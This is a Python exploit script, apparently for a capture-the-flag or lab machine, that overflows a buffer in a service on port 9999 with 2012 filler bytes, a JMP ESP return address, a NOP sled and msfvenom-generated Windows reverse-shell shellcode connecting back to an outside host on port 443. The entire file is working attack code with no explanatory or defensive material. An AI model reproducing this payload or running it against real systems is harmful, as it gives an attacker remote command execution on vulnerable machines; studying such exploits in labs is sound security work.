#!/usr/bin/env python

import socket, sys

ip = "10.10.10.185"
port = 9999

# \x00
jmp_eip = "\xdf\x14\x50\x62"
offset = 2012
username = "xen"
overflow = "A"*offset 
padding = "\x90" * 10

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.234 LPORT=443 EXITFUNC=thread -f py -b "\x00" -v payload

payload =  ""
payload += "\xda\xde\xd9\x74\x24\xf4\xbf\x42\xf2\x42\x09\x5e"
payload += "\x31\xc9\xb1\x52\x31\x7e\x17\x83\xc6\x04\x03\x3c"
payload += "\xe1\xa0\xfc\x3c\xed\xa7\xff\xbc\xee\xc7\x76\x59"
payload += "\xdf\xc7\xed\x2a\x70\xf8\x66\x7e\x7d\x73\x2a\x6a"
payload += "\xf6\xf1\xe3\x9d\xbf\xbc\xd5\x90\x40\xec\x26\xb3"
payload += "\xc2\xef\x7a\x13\xfa\x3f\x8f\x52\x3b\x5d\x62\x06"
payload += "\x94\x29\xd1\xb6\x91\x64\xea\x3d\xe9\x69\x6a\xa2"
payload += "\xba\x88\x5b\x75\xb0\xd2\x7b\x74\x15\x6f\x32\x6e"
payload += "\x7a\x4a\x8c\x05\x48\x20\x0f\xcf\x80\xc9\xbc\x2e"
payload += "\x2d\x38\xbc\x77\x8a\xa3\xcb\x81\xe8\x5e\xcc\x56"
payload += "\x92\x84\x59\x4c\x34\x4e\xf9\xa8\xc4\x83\x9c\x3b"
payload += "\xca\x68\xea\x63\xcf\x6f\x3f\x18\xeb\xe4\xbe\xce"
payload += "\x7d\xbe\xe4\xca\x26\x64\x84\x4b\x83\xcb\xb9\x8b"
payload += "\x6c\xb3\x1f\xc0\x81\xa0\x2d\x8b\xcd\x05\x1c\x33"
payload += "\x0e\x02\x17\x40\x3c\x8d\x83\xce\x0c\x46\x0a\x09"
payload += "\x72\x7d\xea\x85\x8d\x7e\x0b\x8c\x49\x2a\x5b\xa6"
payload += "\x78\x53\x30\x36\x84\x86\x97\x66\x2a\x79\x58\xd6"
payload += "\x8a\x29\x30\x3c\x05\x15\x20\x3f\xcf\x3e\xcb\xba"
payload += "\x98\x4a\x01\xc9\x1f\x23\x1b\xd1\x9e\x08\x92\x37"
payload += "\xca\x7e\xf3\xe0\x63\xe6\x5e\x7a\x15\xe7\x74\x07"
payload += "\x15\x63\x7b\xf8\xd8\x84\xf6\xea\x8d\x64\x4d\x50"
payload += "\x1b\x7a\x7b\xfc\xc7\xe9\xe0\xfc\x8e\x11\xbf\xab"
payload += "\xc7\xe4\xb6\x39\xfa\x5f\x61\x5f\x07\x39\x4a\xdb"
payload += "\xdc\xfa\x55\xe2\x91\x47\x72\xf4\x6f\x47\x3e\xa0"
payload += "\x3f\x1e\xe8\x1e\x86\xc8\x5a\xc8\x50\xa6\x34\x9c"
payload += "\x25\x84\x86\xda\x29\xc1\x70\x02\x9b\xbc\xc4\x3d"
payload += "\x14\x29\xc1\x46\x48\xc9\x2e\x9d\xc8\xe9\xcc\x37"
payload += "\x25\x82\x48\xd2\x84\xcf\x6a\x09\xca\xe9\xe8\xbb"
payload += "\xb3\x0d\xf0\xce\xb6\x4a\xb6\x23\xcb\xc3\x53\x43"
payload += "\x78\xe3\x71"


exploit = overflow  + jmp_eip + padding + payload

try:
    print("Sending buffer")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip,port))
    s.recv(1024)
    s.send(username + '\r\n')
    s.recv(1024)
    s.send(exploit+ '\r\n')
    s.recv(1024)
except:
    print("error!")
    sys.exit(0)
finally:
    s.close() 
